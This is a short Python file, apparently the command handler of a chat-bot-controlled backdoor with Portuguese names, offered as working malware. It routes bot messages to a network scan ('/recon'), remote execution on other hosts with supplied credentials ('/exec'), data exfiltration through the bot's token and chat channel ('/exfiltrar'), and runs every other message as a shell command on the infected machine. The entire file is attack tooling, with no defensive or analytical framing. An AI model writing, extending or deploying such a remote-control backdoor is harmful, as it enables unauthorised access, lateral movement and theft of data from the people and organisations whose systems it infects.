import subprocess, os, requests
from core.movimento_lateral import exec_remoto, scan_rede
from core.exfiltracao import exfiltrar

def tratar(msg, token, chat_id):
    if msg == "/recon":
        ativos = scan_rede()
        return "Ativos: " + ", ".join(ativos)
    elif msg.startswith("/exec "):
        try:
            _, ip, u, p = msg.split()
            return exec_remoto(ip, u, p)
        except: return "Uso: /exec IP usuario senha"
    elif msg == "/exfiltrar":
        exfiltrar(token, chat_id)
        return "Exfiltração enviada."
    else:
        try:
            return subprocess.getoutput(msg)
        except: return "Erro ao executar comando."